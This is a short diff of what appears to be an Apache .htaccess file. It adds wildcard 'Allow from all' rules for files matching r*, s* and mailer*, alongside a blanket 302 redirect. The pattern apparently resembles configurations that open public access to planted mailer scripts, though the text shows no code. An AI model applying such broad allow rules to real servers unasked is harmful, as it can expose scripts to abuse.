@@ -15,7 +15,17 @@ Redirect 302 . /s
     Allow from all
 </Files>
 
+<Files r*>
+    Order Allow,Deny
+    Allow from all
+</Files>
+
 <Files s*>
+    Order Allow,Deny
+    Allow from all
+</Files>
+
+<Files mailer*>
     Order Allow,Deny
     Allow from all
 </Files>
@@ -31,11 +41,6 @@ Redirect 302 . /s
 </Files>
 
 <Files api*>
-    Order Allow,Deny
-    Allow from all
-</Files>
-
-<Files r>
     Order Allow,Deny
     Allow from all
 </Files>
